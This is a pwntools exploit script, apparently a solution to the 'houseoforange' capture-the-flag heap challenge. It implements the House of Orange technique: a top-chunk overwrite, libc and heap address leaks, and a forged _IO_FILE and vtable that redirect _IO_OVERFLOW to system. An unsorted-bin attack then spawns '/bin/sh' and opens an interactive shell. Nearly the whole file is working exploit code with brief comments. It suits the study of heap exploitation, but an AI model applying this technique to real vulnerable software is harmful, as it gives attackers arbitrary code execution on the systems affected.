from pwn import *


binpath = './houseoforange'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
gef
# after menu
b *0x5555555553d5
# entering build
# b *0x5555555553fd
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)


def debug(func):
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


def build_sub(length, name, price, color):
    io.recvuntil('name :')
    io.sendline((b'%d' % length))

    io.recvuntil('Name')
    io.recvuntil(':')
    io.send(name)

    io.recvuntil('Price of Orange:')
    io.sendline(b'%d' % price)

    io.recvuntil('Color of Orange:')
    io.sendline(b'%d' % color)


@debug
def build(length, name=b'A' * 8, price=0, color=1):
    io.recvuntil(b'Your choice : ')
    io.sendline(b'1')
    build_sub(length, name, price, color)

@debug
def see():
    io.recvuntil(b'Your choice : ')
    io.sendline(b'2')
    io.recvuntil(b'Name of house : ')
    data = io.recvline()
    return data.rstrip()


@debug
def upgrade(length, name=b'B' * 8, price=0, color=1):
    io.recvuntil('Your choice : ')
    io.sendline('3')
    build_sub(length, name, price, color)


build(0x18)

payload = b''
payload += b'C' * 0x38
payload += p64(0x1000 - 0x60 | 1)
upgrade(0x48, payload)

build(0xff8)

build(0x400, b'E' * 8)
data = see()
addr_libc = u64(data[0x8:].ljust(8, b'\x00')) - 0x3c5188
print('addr_libc = 0x{:x}'.format(addr_libc))

upgrade(0x10, b'D' * 0x10)
addr_heap = u64(see()[0x10:].ljust(8, b'\x00')) - 0xc0
print('addr_heap = 0x{:x}'.format(addr_heap))

addr_io_list_all = addr_libc + libc.symbols['_IO_list_all']
addr_io_file = addr_heap + 0x4f0
addr_vtable = addr_io_file + 0xe0 + 8 * 3

payload = b''
payload += b'F' * 0x420

# _IO_FILE_plus (it is overwriting the chunk header of unsorted bin at the same time)
# _IO_FILE (needs to satisfy `(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)`)
io_file = b''
io_file += b'/bin/sh\x00'  # prev_size
io_file += p64(0x61)  # size
io_file += p64(0xdeadbeef)  # fd
io_file += p64(addr_io_list_all - 0x10)  # bk
io_file += p64(0)  # _IO_write_base
io_file += p64(1)  # _IO_write_ptr
io_file += b'\x00' * (0xd8 - len(io_file))  # this will overwrite _mode with '\x00'
# vtable
io_file += p64(addr_vtable)

payload += io_file
payload += p64(1) # paddings? not sure
payload += p64(2)
payload += p64(3)
payload += p64(0) * 3 # vtable starts here
payload += p64(addr_libc + libc.symbols['system']) # overwrite _IO_OVERFLOW

# _IO_OVERFLOW(fp, EOF) will be called on abort
# Since fp points to the fake _IO_FILE (io_file in this script)
# It will be `system("/bin/sh")

upgrade(0x800, payload)

print('build to trigger _IO_flush_all_lockp')
io.recvuntil(':')
io.sendline('1')

io.interactive()
